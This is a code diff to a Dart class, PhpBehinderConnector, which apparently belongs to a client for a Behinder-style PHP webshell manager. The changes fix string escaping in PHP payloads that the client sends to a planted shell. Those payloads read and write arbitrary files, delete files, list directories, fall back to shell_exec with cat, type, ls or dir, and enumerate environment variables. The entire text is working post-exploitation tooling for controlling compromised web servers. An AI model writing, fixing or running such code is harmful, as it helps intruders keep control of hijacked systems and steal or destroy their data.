@@ -197,7 +197,10 @@ class PhpBehinderConnector extends ShellConnector {
   @override
   Future<String?> getShellScriptDir() async {
     final r = (await _sendPhp(
-      '\$d=@realpath(dirname(__FILE__));echo (\$d!==false&&\$d!=="")?\$d:"";',
+      '\$f=isset(\$_SERVER["SCRIPT_FILENAME"])?\$_SERVER["SCRIPT_FILENAME"]:"";'
+      '\$d=(\$f!=="")?@realpath(dirname(\$f)):false;'
+      'if(\$d===false||\$d===""){\$f2=explode("(",__FILE__)[0];\$d=@realpath(dirname(\$f2));}'
+      'echo(\$d!==false&&\$d!=="")?\$d:"";',
     )).trim();
     if (r.isEmpty || r.startsWith('[')) return null;
     return r;
@@ -275,12 +278,12 @@ class PhpBehinderConnector extends ShellConnector {
     final b64 = base64.encode(utf8.encode(path));
     return _sendPhp(
       "\$p=base64_decode('$b64');"
-      r"if(!file_exists(\$p)){echo '[文件不存在或无权读取]';exit;}"
-      r"\$c=@file_get_contents(\$p);"
-      r"if(\$c===false){"
-      r"\$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'type '.chr(34).str_replace(chr(34),chr(34).chr(34),\$p).chr(34):'cat '.escapeshellarg(\$p).' 2>/dev/null'));"
-      r"echo \$o!==null?\$o:'[文件不存在或无权读取]';exit;}"
-      r"echo \$c;",
+      r"if(!file_exists($p)){echo '[文件不存在或无权读取]';exit;}"
+      r"$c=@file_get_contents($p);"
+      r"if($c===false){"
+      r"$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'type '.chr(34).str_replace(chr(34),chr(34).chr(34),$p).chr(34):'cat '.escapeshellarg($p).' 2>/dev/null'));"
+      r"echo $o!==null?$o:'[文件不存在或无权读取]';exit;}"
+      r"echo $c;",
     );
   }
 
@@ -291,7 +294,7 @@ class PhpBehinderConnector extends ShellConnector {
     final r = await _sendPhp(
       "\$p=base64_decode('$pathB64');"
       "\$c=base64_decode('$contentB64');"
-      r"echo file_put_contents(\$p,\$c)!==false?'1':'0';",
+      r"echo file_put_contents($p,$c)!==false?'1':'0';",
     );
     return r.trim() == '1';
   }
@@ -359,7 +362,7 @@ class PhpBehinderConnector extends ShellConnector {
     final b64 = base64.encode(utf8.encode(path));
     final r = await _sendPhp(
       "\$p=base64_decode('$b64');"
-      r"echo @unlink(\$p)?'1':'0';",
+      r"echo @unlink($p)?'1':'0';",
     );
     return r.trim() == '1';
   }
@@ -418,16 +421,16 @@ foreach($info as $k=>$v){
     final b64 = base64.encode(utf8.encode(path));
     final code =
         "\$p=base64_decode('$b64');"
-        r"\$d=@opendir(\$p);"
-        r"if(\$d===false){"
-        r"\$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),\$p).chr(34):'ls -1a '.escapeshellarg(\$p).' 2>/dev/null'));"
-        r"if(\$o!==null){foreach(explode(chr(10),trim(\$o)) as \$f){\$f=trim(\$f);if(\$f===''||\$f==='.'||\$f==='..')continue;\$t=@is_dir(\$p.DIRECTORY_SEPARATOR.\$f)?'d':'f';echo base64_encode(\$f).'|'.\$t.chr(10);}}"
+        r"$d=@opendir($p);"
+        r"if($d===false){"
+        r"$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),$p).chr(34):'ls -1a '.escapeshellarg($p).' 2>/dev/null'));"
+        r"if($o!==null){foreach(explode(chr(10),trim($o)) as $f){$f=trim($f);if($f===''||$f==='.'||$f==='..')continue;$t=@is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';echo base64_encode($f).'|'.$t.chr(10);}}"
         r"exit;}"
-        r"while((\$f=readdir(\$d))!==false){"
-        r"if(\$f==='.'||\$f==='..'){continue;}"
-        r"\$t=is_dir(\$p.DIRECTORY_SEPARATOR.\$f)?'d':'f';"
-        r"echo base64_encode(\$f).'|'.\$t.chr(10);"
-        r"}closedir(\$d);";
+        r"while(($f=readdir($d))!==false){"
+        r"if($f==='.'||$f==='..'){continue;}"
+        r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
+        r"echo base64_encode($f).'|'.$t.chr(10);"
+        r"}closedir($d);";
     final result = await _sendPhp(code);
     if (result.isEmpty || result.startsWith('[')) return [];
     final out = <({String name, bool isDir})>[];
@@ -450,7 +453,7 @@ foreach($info as $k=>$v){
   @override
   Future<List<String>> listEnvVarNames() async {
     final result = await _sendPhp(
-      r"foreach(array_keys((array)getenv()) as \$k){echo \$k.chr(10);}",
+      r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}",
     );
     if (result.isEmpty || result.startsWith('[')) return [];
     return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
